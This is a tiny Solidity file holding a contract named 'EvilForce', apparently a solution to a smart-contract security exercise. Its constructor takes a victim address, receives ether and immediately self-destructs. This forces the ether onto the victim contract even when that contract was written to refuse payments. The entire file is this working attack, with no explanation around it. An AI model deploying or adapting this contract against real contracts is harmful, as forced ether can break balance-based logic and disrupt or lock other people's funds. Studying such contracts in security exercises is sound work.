// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract EvilForce {
    
    constructor(address payable _victim) public payable {
        selfdestruct(_victim);
    }
}